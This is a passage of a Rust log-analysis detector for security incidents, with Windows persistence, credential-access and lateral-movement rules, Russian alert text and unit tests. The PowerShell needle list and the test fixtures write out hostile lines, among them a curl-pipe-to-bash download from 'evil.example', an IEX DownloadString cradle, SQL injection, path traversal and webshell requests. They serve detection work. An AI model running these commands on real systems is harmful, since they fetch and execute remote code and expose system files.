        let name = e.fields.get("service_name").cloned().unwrap_or_default();
        let image = e
            .fields
            .get("image_path")
            .or_else(|| e.fields.get("service_file"))
            .cloned()
            .unwrap_or_default();
        let suspicious = {
            let il = image.to_ascii_lowercase();
            SUSPICIOUS_IMAGE.iter().any(|n| il.contains(n))
        };
        findings.push(Finding {
            rule: "windows-service-persistence".into(),
            title: "Установка новой службы (закрепление)".into(),
            severity: if suspicious {
                Severity::High
            } else {
                Severity::Medium
            },
            mitre: vec!["T1543.003".into()],
            summary: format!(
                "Установлена новая служба «{}»{}. Частый способ закрепления — проверьте путь к образу.{}",
                if name.is_empty() { "?".into() } else { name.clone() },
                if image.is_empty() {
                    String::new()
                } else {
                    format!(" (образ: {image})")
                },
                if suspicious {
                    " Путь к образу выглядит подозрительно."
                } else {
                    ""
                }
            ),
            actor: (!name.is_empty()).then_some(name),
            first_time: e.timestamp.clone(),
            last_time: e.timestamp.clone(),
            evidence: vec![EvidenceRef::of(e)],
            hosts: hosts_of(std::iter::once(e)),
        });
    }
    findings
}

/// A newly created scheduled task (4698) — another common foothold.
fn windows_task_persistence(events: &[LogEvent]) -> Vec<Finding> {
    let mut findings = Vec::new();
    for e in events {
        if !is_windows(e) || win_id(e) != Some(4698) {
            continue;
        }
        let name = e.fields.get("task_name").cloned().unwrap_or_default();
        findings.push(Finding {
            rule: "windows-task-persistence".into(),
            title: "Создана задача планировщика (закрепление)".into(),
            severity: Severity::Medium,
            mitre: vec!["T1053.005".into()],
            summary: format!(
                "Создана задача планировщика{}. Проверьте действие, которое она запускает.",
                if name.is_empty() {
                    String::new()
                } else {
                    format!(" «{name}»")
                }
            ),
            actor: e.actor.clone(),
            first_time: e.timestamp.clone(),
            last_time: e.timestamp.clone(),
            evidence: vec![EvidenceRef::of(e)],
            hosts: hosts_of(std::iter::once(e)),
        });
    }
    findings
}

/// Hallmarks of a malicious PowerShell script block (4104): encoded commands,
/// in-memory download-and-run, offensive tooling.
const PS_NEEDLES: &[&str] = &[
    "-enc",
    "-encodedcommand",
    "frombase64string",
    "downloadstring",
    "downloadfile",
    "invoke-expression",
    "iex(",
    "iex ",
    "net.webclient",
    "-nop ",
    "-noprofile",
    "-w hidden",
    "-windowstyle hidden",
    "bypass",
    "invoke-mimikatz",
    "invoke-webrequest",
    "start-bitstransfer",
    "reflection.assembly",
];

/// Suspicious PowerShell script-block logging (4104), grouped per host.
fn windows_powershell(events: &[LogEvent]) -> Vec<Finding> {
    struct Group<'a> {
        hits: Vec<&'a LogEvent>,
    }
    let mut groups: BTreeMap<String, Group> = BTreeMap::new();
    for e in events {
        if !is_windows(e) || win_id(e) != Some(4104) {
            continue;
        }
        let script = e
            .fields
            .get("script")
            .map(|s| s.to_ascii_lowercase())
            .unwrap_or_default();
        if !PS_NEEDLES.iter().any(|n| script.contains(n)) {
            continue;
        }
        let host = crate::correlate::event_host(e).unwrap_or_default();
        groups
            .entry(host)
            .or_insert_with(|| Group { hits: Vec::new() })
            .hits
            .push(e);
    }

    let mut findings = Vec::new();
    for (_host, group) in groups {
        let n = group.hits.len();
        let first = group.hits.first().unwrap();
        let last = group.hits.last().unwrap();
        let evidence: Vec<EvidenceRef> = group
            .hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        findings.push(Finding {
            rule: "windows-powershell-suspicious".into(),
            title: "Подозрительный PowerShell".into(),
            severity: Severity::High,
            mitre: vec!["T1059.001".into()],
            summary: format!(
                "Зафиксировано {n} подозрительных блоков PowerShell (закодированные команды, загрузка и запуск кода из сети). Проверьте содержимое сценариев."
            ),
            actor: None,
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts: hosts_of(group.hits.iter().copied()),
        });
    }
    findings
}

/// Microsoft Defender being turned off (5001) or raising a detection
/// (1116/1006/1117).
fn windows_defender(events: &[LogEvent]) -> Vec<Finding> {
    let mut findings = Vec::new();
    for e in events {
        if !is_windows(e) {
            continue;
        }
        match win_id(e) {
            Some(5001) => findings.push(Finding {
                rule: "windows-defender-disabled".into(),
                title: "Отключена защита Microsoft Defender".into(),
                severity: Severity::High,
                mitre: vec!["T1562.001".into()],
                summary: "Отключена защита в реальном времени Microsoft Defender — возможная подготовка к запуску вредоносного ПО.".into(),
                actor: None,
                first_time: e.timestamp.clone(),
                last_time: e.timestamp.clone(),
                evidence: vec![EvidenceRef::of(e)],
                hosts: hosts_of(std::iter::once(e)),
            }),
            Some(1116) | Some(1006) | Some(1117) => {
                let threat = e.fields.get("threat").cloned().unwrap_or_default();
                findings.push(Finding {
                    rule: "windows-malware-detected".into(),
                    title: "Microsoft Defender обнаружил угрозу".into(),
                    severity: Severity::High,
                    mitre: vec!["T1059".into()],
                    summary: format!(
                        "Microsoft Defender зафиксировал вредоносную активность{}.",
                        if threat.is_empty() {
                            String::new()
                        } else {
                            format!(": {threat}")
                        }
                    ),
                    actor: (!threat.is_empty()).then_some(threat),
                    first_time: e.timestamp.clone(),
                    last_time: e.timestamp.clone(),
                    evidence: vec![EvidenceRef::of(e)],
                    hosts: hosts_of(std::iter::once(e)),
                });
            }
            _ => {}
        }
    }
    findings
}

// ---------------------------------------------------------------------------
// Windows credential access
// ---------------------------------------------------------------------------

/// Access to LSASS memory (Sysmon 10, which the parser keeps only for an LSASS
/// target) — the hallmark of credential dumping. Grouped per accessing image.
fn windows_lsass_access(events: &[LogEvent]) -> Vec<Finding> {
    let mut by_src: BTreeMap<String, Vec<&LogEvent>> = BTreeMap::new();
    for e in events {
        if !is_windows(e) || win_id(e) != Some(10) {
            continue;
        }
        let src = e
            .fields
            .get("source_image")
            .cloned()
            .unwrap_or_else(|| "?".into());
        by_src.entry(src).or_default().push(e);
    }
    let mut findings = Vec::new();
    for (src, hits) in by_src {
        let first = hits.first().unwrap();
        let last = hits.last().unwrap();
        let evidence = hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        findings.push(Finding {
            rule: "windows-lsass-access".into(),
            title: "Доступ к памяти LSASS (кража учётных данных)".into(),
            severity: Severity::Critical,
            mitre: vec!["T1003.001".into()],
            summary: format!(
                "Процесс {src} обращался к памяти LSASS — характерно для дампа учётных данных (например, mimikatz). Проверьте этот процесс."
            ),
            actor: Some(src),
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts: hosts_of(hits.iter().copied()),
        });
    }
    findings
}

/// Kerberoasting (4769): a service ticket requested with RC4 (0x17) encryption
/// for a user-account SPN (not a machine account, not krbtgt). Grouped per
/// requesting account; many distinct SPNs raises the severity.
fn windows_kerberoasting(events: &[LogEvent]) -> Vec<Finding> {
    struct Per<'a> {
        hits: Vec<&'a LogEvent>,
        services: std::collections::BTreeSet<String>,
    }
    let mut by_user: BTreeMap<String, Per> = BTreeMap::new();
    for e in events {
        if !is_windows(e) || win_id(e) != Some(4769) {
            continue;
        }
        // RC4 (0x17) is the roastable signal; AES tickets are left alone.
        if e.fields.get("ticket_encryption").map(String::as_str) != Some("0x17") {
            continue;
        }
        let svc = e.fields.get("service").cloned().unwrap_or_default();
        let sl = svc.to_ascii_lowercase();
        // Machine-account SPNs ($) and krbtgt are not kerberoastable service
        // accounts; skip them to cut false positives.
        if svc.is_empty() || sl.ends_with('$') || sl.contains("krbtgt") {
            continue;
        }
        let user = e.actor.clone().unwrap_or_else(|| "?".into());
        let entry = by_user.entry(user).or_insert_with(|| Per {
            hits: Vec::new(),
            services: std::collections::BTreeSet::new(),
        });
        entry.hits.push(e);
        entry.services.insert(svc);
    }
    let mut findings = Vec::new();
    for (user, per) in by_user {
        let first = per.hits.first().unwrap();
        let last = per.hits.last().unwrap();
        let evidence = per
            .hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        // One roastable ticket is a lead; a sweep of many SPNs is a strong one.
        let severity = if per.services.len() >= 5 {
            Severity::High
        } else {
            Severity::Medium
        };
        findings.push(Finding {
            rule: "windows-kerberoasting".into(),
            title: "Возможный Kerberoasting".into(),
            severity,
            mitre: vec!["T1558.003".into()],
            summary: format!(
                "Учётная запись {user} запросила RC4-билеты Kerberos для {} служебных учёток ({}). Характерно для Kerberoasting — проверьте, легитимен ли запрос.",
                per.services.len(),
                per.services.iter().cloned().collect::<Vec<_>>().join(", ")
            ),
            actor: Some(user),
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts: hosts_of(per.hits.iter().copied()),
        });
    }
    findings
}

/// Password spray (4625/4771): one source failing against many distinct
/// accounts — a breadth pattern, distinct from brute force against one account.
fn windows_password_spray(events: &[LogEvent]) -> Vec<Finding> {
    struct Per<'a> {
        hits: Vec<&'a LogEvent>,
        users: std::collections::BTreeSet<String>,
    }
    let mut by_src: BTreeMap<String, Per> = BTreeMap::new();
    for e in events {
        if !is_windows(e) || !matches!(win_id(e), Some(4625) | Some(4771)) {
            continue;
        }
        let Some(ip) = e
            .fields
            .get("ip")
            .filter(|s| !s.is_empty() && s.as_str() != "-")
        else {
            continue;
        };
        let user = e.actor.clone().unwrap_or_default();
        if user.is_empty() {
            continue;
        }
        let entry = by_src.entry(ip.clone()).or_insert_with(|| Per {
            hits: Vec::new(),
            users: std::collections::BTreeSet::new(),
        });
        entry.hits.push(e);
        entry.users.insert(user.to_ascii_lowercase());
    }
    let mut findings = Vec::new();
    for (ip, per) in by_src {
        // Spray = many accounts from one source. Fewer than this is better
        // described by the brute-force detector (one account, many tries).
        if per.users.len() < 5 {
            continue;
        }
        let first = per.hits.first().unwrap();
        let last = per.hits.last().unwrap();
        let evidence = per
            .hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        findings.push(Finding {
            rule: "windows-password-spray".into(),
            title: "Распыление пароля (password spray)".into(),
            severity: Severity::High,
            mitre: vec!["T1110.003".into()],
            summary: format!(
                "С источника {ip} — неудачные входы под {} различными учётными записями. Похоже на распыление пароля по множеству аккаунтов.",
                per.users.len()
            ),
            actor: Some(ip),
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts: hosts_of(per.hits.iter().copied()),
        });
    }
    findings
}

/// Process injection via CreateRemoteThread (Sysmon 8) — rare and high-signal.
fn windows_process_injection(events: &[LogEvent]) -> Vec<Finding> {
    let mut findings = Vec::new();
    for e in events {
        if !is_windows(e) || win_id(e) != Some(8) {
            continue;
        }
        let src = e.fields.get("source_image").cloned().unwrap_or_default();
        let tgt = e.fields.get("target_image").cloned().unwrap_or_default();
        findings.push(Finding {
            rule: "windows-process-injection".into(),
            title: "Внедрение в процесс (CreateRemoteThread)".into(),
            severity: Severity::High,
            mitre: vec!["T1055".into()],
            summary: format!(
                "Процесс {} создал поток в чужом процессе {} — характерно для внедрения кода.",
                if src.is_empty() {
                    "?".into()
                } else {
                    src.clone()
                },
                if tgt.is_empty() { "?".into() } else { tgt }
            ),
            actor: (!src.is_empty()).then_some(src),
            first_time: e.timestamp.clone(),
            last_time: e.timestamp.clone(),
            evidence: vec![EvidenceRef::of(e)],
            hosts: hosts_of(std::iter::once(e)),
        });
    }
    findings
}

// ---------------------------------------------------------------------------
// Windows lateral movement
// ---------------------------------------------------------------------------

/// The administrative-share component of a share path (`\\*\ADMIN$` → `admin$`).
fn share_leaf(share: &str) -> String {
    share
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(share)
        .to_ascii_lowercase()
}

/// Access to an administrative share — `ADMIN$` or `C$` (5140/5145). Remote
/// admin tooling and PsExec reach a host this way. `IPC$` is excluded as
/// everyday traffic. Grouped per (share, source).
fn windows_admin_share(events: &[LogEvent]) -> Vec<Finding> {
    struct Per<'a> {
        hits: Vec<&'a LogEvent>,
        external: bool,
    }
    let mut groups: BTreeMap<(String, String), Per> = BTreeMap::new();
    for e in events {
        if !is_windows(e) || !matches!(win_id(e), Some(5140) | Some(5145)) {
            continue;
        }
        let Some(share) = e.fields.get("share") else {
            continue;
        };
        let leaf = share_leaf(share);
        if leaf != "admin$" && leaf != "c$" {
            continue;
        }
        let ip = e.fields.get("ip").cloned().unwrap_or_default();
        let entry = groups.entry((leaf, ip.clone())).or_insert_with(|| Per {
            hits: Vec::new(),
            external: false,
        });
        entry.hits.push(e);
        if crate::correlate::is_external_ip(&ip) {
            entry.external = true;
        }
    }
    let mut findings = Vec::new();
    for ((leaf, ip), per) in groups {
        let first = per.hits.first().unwrap();
        let last = per.hits.last().unwrap();
        let evidence = per
            .hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        findings.push(Finding {
            rule: "windows-admin-share".into(),
            title: "Доступ к административному ресурсу (перемещение по сети)".into(),
            severity: if per.external {
                Severity::High
            } else {
                Severity::Medium
            },
            mitre: vec!["T1021.002".into()],
            summary: format!(
                "Доступ к административному ресурсу {}{}. Так работают удалённое администрирование и PsExec — подтвердите легитимность.",
                leaf.to_ascii_uppercase(),
                if ip.is_empty() {
                    String::new()
                } else {
                    format!(" с адреса {ip}")
                }
            ),
            actor: (!ip.is_empty()).then_some(ip),
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts: hosts_of(per.hits.iter().copied()),
        });
    }
    findings
}

/// Service names/images left behind by remote-execution tools (PsExec and
/// friends) installed as a Windows service (7045) — a lateral-movement marker.
const REMOTE_EXEC_SERVICE: &[&str] = &["psexesvc", "paexec", "csexec", "remcom", "winexesvc"];

fn windows_remote_service(events: &[LogEvent]) -> Vec<Finding> {
    let mut findings = Vec::new();
    for e in events {
        if !is_windows(e) || win_id(e) != Some(7045) {
            continue;
        }
        let name = e.fields.get("service_name").cloned().unwrap_or_default();
        let image = e.fields.get("image_path").cloned().unwrap_or_default();
        let hay = format!("{name} {image}").to_ascii_lowercase();
        if !REMOTE_EXEC_SERVICE.iter().any(|n| hay.contains(n)) {
            continue;
        }
        findings.push(Finding {
            rule: "windows-remote-service".into(),
            title: "Удалённое выполнение через службу (PsExec)".into(),
            severity: Severity::High,
            mitre: vec!["T1021.002".into(), "T1569.002".into()],
            summary: format!(
                "Установлена служба «{}», характерная для удалённого выполнения (PsExec и аналоги) — признак перемещения по сети.",
                if name.is_empty() { "?".into() } else { name.clone() }
            ),
            actor: (!name.is_empty()).then_some(name),
            first_time: e.timestamp.clone(),
            last_time: e.timestamp.clone(),
            evidence: vec![EvidenceRef::of(e)],
            hosts: hosts_of(std::iter::once(e)),
        });
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{analyze_path, Options};
    use std::io::Write;

    struct TempDir(std::path::PathBuf);
    impl TempDir {
        fn new(tag: &str) -> Self {
            let mut p = std::env::temp_dir();
            p.push(format!(
                "incident-det-{tag}-{}-{:?}",
                std::process::id(),
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_nanos()
            ));
            std::fs::create_dir_all(&p).unwrap();
            TempDir(p)
        }
        fn write(&self, name: &str, body: &str) {
            let mut f = std::fs::File::create(self.0.join(name)).unwrap();
            f.write_all(body.as_bytes()).unwrap();
        }
    }
    impl Drop for TempDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }
    fn opts() -> Options {
        Options {
            assume_year: Some(2026),
            ..Options::default()
        }
    }
    fn find<'a>(f: &'a [Finding], rule: &str) -> &'a Finding {
        f.iter()
            .find(|x| x.rule == rule)
            .unwrap_or_else(|| panic!("no finding {rule} in {f:#?}"))
    }

    #[test]
    fn bruteforce_then_success_is_critical_with_the_success_line() {
        let d = TempDir::new("bf");
        let mut body = String::new();
        for i in 0..6 {
            body.push_str(&format!(
                "Oct 10 13:55:{:02} web01 sshd[2200]: Failed password for invalid user admin from 192.0.2.50 port 5000{} ssh2\n",
                30 + i, i
            ));
        }
        body.push_str("Oct 10 13:56:10 web01 sshd[2211]: Accepted password for deploy from 192.0.2.50 port 50422 ssh2\n");
        d.write("auth.log", &body);

        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "ssh-bruteforce-success");
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.actor.as_deref(), Some("192.0.2.50"));
        assert!(f.mitre.iter().any(|m| m == "T1110"));
        // The success line is in the evidence.
        assert!(f
            .evidence
            .iter()
            .any(|e| e.raw.contains("Accepted password for deploy")));
    }

    #[test]
    fn failures_without_success_are_high_not_critical() {
        let d = TempDir::new("bfonly");
        let mut body = String::new();
        for i in 0..6 {
            body.push_str(&format!(
                "Oct 10 13:55:{:02} web01 sshd[2200]: Failed password for root from 198.51.100.7 port 600{} ssh2\n",
                30 + i, i
            ));
        }
        d.write("auth.log", &body);
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "ssh-bruteforce");
        assert_eq!(f.severity, Severity::High);
        assert!(t
            .findings
            .iter()
            .all(|x| x.rule != "ssh-bruteforce-success"));
    }

    #[test]
    fn four_failures_do_not_trigger() {
        let d = TempDir::new("few");
        let mut body = String::new();
        for i in 0..4 {
            body.push_str(&format!(
                "Oct 10 13:55:{:02} web01 sshd[2200]: Failed password for root from 203.0.113.1 port 600{} ssh2\n",
                30 + i, i
            ));
        }
        d.write("auth.log", &body);
        let t = analyze_path(&d.0, &opts()).unwrap();
        assert!(t
            .findings
            .iter()
            .all(|x| !x.rule.starts_with("ssh-bruteforce")));
    }

    #[test]
    fn sqli_and_traversal_in_access_log_are_flagged() {
        let d = TempDir::new("web");
        d.write(
            "access.log",
            "192.0.2.9 - - [10/Oct/2026:14:00:00 +0000] \"GET /p?id=1'%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1\" 200 10 \"-\" \"x\"\n\
             192.0.2.9 - - [10/Oct/2026:14:00:01 +0000] \"GET /../../etc/passwd HTTP/1.1\" 404 10 \"-\" \"x\"\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let sqli = find(&t.findings, "web-sqli");
        assert_eq!(sqli.severity, Severity::High);
        assert_eq!(sqli.actor.as_deref(), Some("192.0.2.9"));
        let trav = find(&t.findings, "web-path-traversal");
        assert!(trav.evidence.iter().any(|e| e.raw.contains("/etc/passwd")));
    }

    #[test]
    fn a_live_webshell_2xx_is_flagged_but_a_404_probe_is_not() {
        let d = TempDir::new("shell");
        d.write(
            "access.log",
            // A recon probe for a shell → 404: not a webshell finding.
            "203.0.113.5 - - [10/Oct/2026:14:00:00 +0000] \"GET /shell.php HTTP/1.1\" 404 10 \"-\" \"x\"\n\
             203.0.113.5 - - [10/Oct/2026:14:00:05 +0000] \"GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 42 \"-\" \"x\"\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "web-webshell");
        assert_eq!(f.severity, Severity::High);
        assert_eq!(f.actor.as_deref(), Some("203.0.113.5"));
        // Exactly the 2xx hit is evidence, not the 404 probe.
        assert!(f.evidence.iter().all(|e| e.raw.contains("200")));
    }

    #[test]
    fn a_cmd_param_without_a_shell_name_is_not_a_webshell() {
        // The real-capture false positive: a cmd= param on a 404, and an
        // eval-stdin recon probe, must not raise web-webshell.
        let d = TempDir::new("noshell");
        d.write(
            "access.log",
            "203.0.113.6 - - [10/Oct/2026:14:00:00 +0000] \"GET /run?cmd=%3Bcat%20%2Fetc%2Fpasswd HTTP/1.1\" 404 10 \"-\" \"x\"\n\
             203.0.113.6 - - [10/Oct/2026:14:00:01 +0000] \"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 404 10 \"-\" \"x\"\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        assert!(
            t.findings.iter().all(|f| f.rule != "web-webshell"),
            "{:#?}",
            t.findings
        );
    }

    #[test]
    fn a_benign_request_raises_nothing() {
        let d = TempDir::new("benign");
        d.write(
            "access.log",
            "192.0.2.9 - - [10/Oct/2026:14:00:00 +0000] \"GET /index.html HTTP/1.1\" 200 10 \"-\" \"Mozilla\"\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        assert!(t.findings.is_empty(), "{:#?}", t.findings);
    }

    #[test]
    fn new_account_is_detected() {
        let d = TempDir::new("acct");
        d.write(
            "auth.log",
            "Oct 10 14:05:00 web01 useradd[3001]: new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "account-created");
        assert!(f.mitre.iter().any(|m| m == "T1136"));
        assert!(f.evidence[0].raw.contains("backdoor"));
        // The created account's name is surfaced as the actor.
        assert_eq!(f.actor.as_deref(), Some("backdoor"));
    }

    #[test]
    fn sudo_log_clearing_is_critical() {
        let d = TempDir::new("logclear");
        d.write(
            "auth.log",
            "Oct 10 15:00:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/journalctl --vacuum-time=1s\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "cmd-log-clearing");
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.actor.as_deref(), Some("deploy"));
        assert!(f.mitre.iter().any(|m| m == "T1070.002"));
    }

    #[test]
    fn sudo_download_and_execute_is_flagged() {
        let d = TempDir::new("dlexec");
        d.write(
            "auth.log",
            "Oct 10 15:01:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c curl http://evil.example/x.sh | bash\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "cmd-download-exec");
        assert_eq!(f.severity, Severity::High);
        assert!(f.mitre.iter().any(|m| m == "T1059.004"));
    }

    #[test]
    fn sudo_offensive_tool_is_flagged() {
        let d = TempDir::new("tool");
        d.write(
            "auth.log",
            "Oct 10 15:02:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/apt-get install netcat\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "cmd-offensive-tool");
        assert_eq!(f.severity, Severity::Medium);
    }

    #[test]
    fn sudo_disabling_defenses_is_flagged() {
        let d = TempDir::new("defoff");
        d.write(
            "auth.log",
            "Oct 10 15:10:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl stop auditd\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "cmd-disable-defense");
        assert_eq!(f.severity, Severity::High);
        assert!(f.mitre.iter().any(|m| m == "T1562.001"));
    }

    #[test]
    fn a_crontab_replace_is_flagged_as_persistence() {
        let d = TempDir::new("cron");
        d.write(
            "syslog",
            "Oct 10 15:20:00 web01 crontab[4120]: (deploy) REPLACE (deploy)\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "cron-modified");
        assert_eq!(f.severity, Severity::Medium);
        assert_eq!(f.actor.as_deref(), Some("deploy"));
        assert!(f.mitre.iter().any(|m| m == "T1053.003"));
    }

    #[test]
    fn a_crontab_list_is_not_persistence() {
        // Only REPLACE (an edit/install) is a lead; listing a crontab is not.
        let d = TempDir::new("cronlist");
        d.write(
            "syslog",
            "Oct 10 15:21:00 web01 crontab[4130]: (deploy) LIST (deploy)\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        assert!(t.findings.iter().all(|f| f.rule != "cron-modified"));
    }

    #[test]
    fn a_finding_carries_the_host_it_occurred_on() {
        // Logs collected into a per-host folder → the finding is attributed to
        // that host, so the UI/report can say "на web01".
        let d = TempDir::new("fhost");
        std::fs::create_dir_all(d.0.join("web01")).unwrap();
        let mut body = String::new();
        for i in 0..6 {
            body.push_str(&format!(
                "Oct 10 13:55:{:02} web01 sshd[2200]: Failed password for root from 198.51.100.7 port 600{} ssh2\n",
                30 + i, i
            ));
        }
        std::fs::write(d.0.join("web01").join("auth.log"), body).unwrap();
        let t = analyze_path(&d.0, &opts()).unwrap();
        let f = find(&t.findings, "ssh-bruteforce");
        assert_eq!(f.hosts, vec!["web01".to_string()]);
    }

    #[test]
    fn a_normal_sudo_command_raises_nothing() {
        let d = TempDir::new("sudok");
        d.write(
            "auth.log",
            "Oct 10 15:03:00 web01 sudo:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        assert!(
            t.findings.iter().all(|f| !f.rule.starts_with("cmd-")),
            "{:#?}",
            t.findings
        );
    }

    // ---- Windows event-log detectors (built from parsed LogEvents) ---------

    /// Build a Windows `LogEvent` as the `.evtx` parser would, for one event id
    /// with the given fields.
    fn win(
        id: i64,
        secs: i64,
        actor: Option<&str>,
        host: &str,
        outcome: Option<Outcome>,
        extra: &[(&str, &str)],
    ) -> LogEvent {
        let mut fields = BTreeMap::new();
        fields.insert("event_id".to_string(), id.to_string());
        for (k, v) in extra {
            fields.insert((*k).to_string(), (*v).to_string());
        }
        LogEvent {
            timestamp: format!("2026-10-10T12:00:{secs:02}Z"),
            source: LogSource::WindowsEvent,
            source_file: "Security.evtx".into(),
            line_no: secs as usize,
            host: Some(host.to_string()),
            actor: actor.map(str::to_string),
            summary: format!("EID {id}"),
            outcome,
            fields,
            raw: format!("EID {id}"),
        }
    }

    #[test]
    fn windows_rdp_bruteforce_then_logon_is_critical() {
        let mut events = Vec::new();
        for i in 0..6 {
            events.push(win(
                4625,
                i,
                Some("administrator"),
                "WIN-DC01",
                Some(Outcome::Failure),
                &[("ip", "203.0.113.9"), ("logon_type", "10")],
            ));
        }
        events.push(win(
            4624,
            10,
            Some("administrator"),
            "WIN-DC01",
            Some(Outcome::Success),
            &[("ip", "203.0.113.9"), ("logon_type", "10")],
        ));
        let out = detect(&events);
        let f = find(&out, "windows-bruteforce-success");
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.actor.as_deref(), Some("203.0.113.9"));
        assert_eq!(f.hosts, vec!["WIN-DC01".to_string()]);
        assert!(f.summary.contains("administrator"), "{}", f.summary);
    }

    #[test]
    fn windows_failures_without_success_are_high() {
        let events: Vec<_> = (0..5)
            .map(|i| {
                win(
                    4625,
                    i,
                    Some("svc"),
                    "SRV",
                    Some(Outcome::Failure),
                    &[("ip", "198.51.100.4")],
                )
            })
            .collect();
        let out = detect(&events);
        assert_eq!(find(&out, "windows-bruteforce").severity, Severity::High);
    }

    #[test]
    fn windows_log_clear_is_critical() {
        let events = vec![win(1102, 1, Some("mallory"), "WIN-DC01", None, &[])];
        let out = detect(&events);
        let f = find(&out, "windows-log-cleared");
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.actor.as_deref(), Some("mallory"));
    }

    #[test]
    fn newly_created_account_added_to_admins_is_critical() {
        let events = vec![
            win(4720, 1, Some("backdoor"), "WIN-DC01", None, &[]),
            win(
                4732,
                2,
                Some("CN=backdoor,CN=Users"),
                "WIN-DC01",
                None,
                &[("group", "Administrators")],
            ),
        ];
        let out = detect(&events);
        assert_eq!(find(&out, "windows-new-admin").severity, Severity::Critical);
        // The plain creation is still reported too.
        assert!(out.iter().any(|f| f.rule == "windows-account-created"));
    }

    #[test]
    fn adding_an_existing_user_to_admins_is_high_not_critical() {
        let events = vec![win(
            4732,
            2,
            Some("olduser"),
            "WIN-DC01",
            None,
            &[("group", "Administrators")],
        )];
        let out = detect(&events);
        assert!(out
            .iter()
            .any(|f| f.rule == "windows-admin-added" && f.severity == Severity::High));
        assert!(out.iter().all(|f| f.rule != "windows-new-admin"));
    }

    #[test]
    fn adding_to_a_normal_group_raises_nothing() {
        let events = vec![win(
            4732,
            2,
            Some("bob"),
            "WIN-DC01",
            None,
            &[("group", "Remote Management Users")],
        )];
        let out = detect(&events);
        assert!(out
            .iter()
            .all(|f| !f.rule.starts_with("windows-admin") && f.rule != "windows-new-admin"));
    }

    #[test]
    fn suspicious_service_image_is_high() {
        let events = vec![win(
            7045,
            1,
            Some("EvilSvc"),
            "WS1",
            None,
            &[
                ("service_name", "EvilSvc"),
                ("image_path", "C:\\Users\\Public\\x.exe -enc ..."),
            ],
        )];
        let out = detect(&events);
        assert_eq!(
            find(&out, "windows-service-persistence").severity,
            Severity::High
        );
    }

    #[test]
    fn ordinary_service_install_is_medium() {
        let events = vec![win(
            7045,
            1,
            Some("Npcap"),
            "WS1",
            None,
            &[
                ("service_name", "npcap"),
                ("image_path", "C:\\Windows\\System32\\drivers\\npcap.sys"),
            ],
        )];
        let out = detect(&events);
        assert_eq!(
            find(&out, "windows-service-persistence").severity,
            Severity::Medium
        );
    }

    #[test]
    fn suspicious_powershell_is_flagged_but_benign_is_not() {
        let bad = vec![win(
            4104,
            1,
            None,
            "WS1",
            None,
            &[(
                "script",
                "IEX (New-Object Net.WebClient).DownloadString('http://evil/x')",
            )],
        )];
        let out = detect(&bad);
        assert_eq!(
            find(&out, "windows-powershell-suspicious").severity,
            Severity::High
        );
        let good = vec![win(
            4104,
            1,
            None,
            "WS1",
            None,
            &[("script", "Get-ChildItem C:\\")],
        )];
        assert!(detect(&good)
            .iter()
            .all(|f| f.rule != "windows-powershell-suspicious"));
    }

    #[test]
    fn defender_disabled_is_high() {
        let events = vec![win(5001, 1, None, "WS1", None, &[])];
        let out = detect(&events);
        assert_eq!(
            find(&out, "windows-defender-disabled").severity,
            Severity::High
        );
    }

    #[test]
    fn lsass_access_is_critical_credential_access() {
        let events = vec![win(
            10,
            1,
            None,
            "WS1",
            None,
            &[
                ("source_image", "C:\\temp\\mimikatz.exe"),
                ("target_image", "C:\\Windows\\System32\\lsass.exe"),
                ("granted_access", "0x1410"),
            ],
        )];
        let out = detect(&events);
